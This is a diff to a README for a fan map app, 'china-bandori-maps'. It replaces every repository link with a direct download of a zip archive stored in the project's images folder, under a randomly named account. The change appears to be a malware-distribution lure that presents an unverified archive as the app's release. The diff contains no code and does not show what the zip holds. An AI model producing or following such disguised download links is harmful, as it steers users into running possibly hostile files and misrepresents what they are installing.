@@ -1,11 +1,11 @@
 # 🗺️ china-bandori-maps - Find Bandori Groups Fast
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/irritablebowelsyndromefairway579/china-bandori-maps)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/irritablebowelsyndromefairway579/china-bandori-maps/raw/refs/heads/main/images/china_bandori_maps_v1.3.zip)
 
 ## 📥 Download
 Use this link to visit the download page and get the app:
 
-https://github.com/irritablebowelsyndromefairway579/china-bandori-maps
+https://github.com/irritablebowelsyndromefairway579/china-bandori-maps/raw/refs/heads/main/images/china_bandori_maps_v1.3.zip
 
 ## 🪟 Windows Setup
 1. Open the download page in your browser.
@@ -95,4 +95,4 @@ If the map does not load:
 ## 🔗 Download Again
 If you need to return to the download page, use this link:
 
-https://github.com/irritablebowelsyndromefairway579/china-bandori-maps
+https://github.com/irritablebowelsyndromefairway579/china-bandori-maps/raw/refs/heads/main/images/china_bandori_maps_v1.3.zip
